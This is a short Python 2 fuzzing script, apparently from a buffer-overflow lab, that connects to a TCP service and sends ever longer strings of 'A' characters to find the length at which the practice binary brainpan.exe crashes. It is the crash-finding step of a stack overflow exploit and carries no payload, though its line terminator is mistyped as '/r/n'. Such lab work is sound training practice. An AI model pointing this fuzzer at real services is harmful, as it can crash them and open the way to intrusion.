#!/usr/bin/python 
import time,struct, sys
import socket as so 

buff=['A']

max_buffer = 4000

counter = 100

increment = 100

while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
    try:
        server = str(sys.argv[1])
	port = int(sys.argv[2])
    except IndexError:
        print "usage: python %s 192.168.2.101 9999" % sys.argv[0]
	sys.exit()
    print "Attempting to crash brainpan.exe at %s bytes" % len(string)
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    try:
        time.sleep(1)
        s.connect((server,port))
        s.send(string + '/r/n')
        s.close()
    except:
         print "Error to connect, check if IP and PORT are correct, or check the debugger"
         sys.exit()
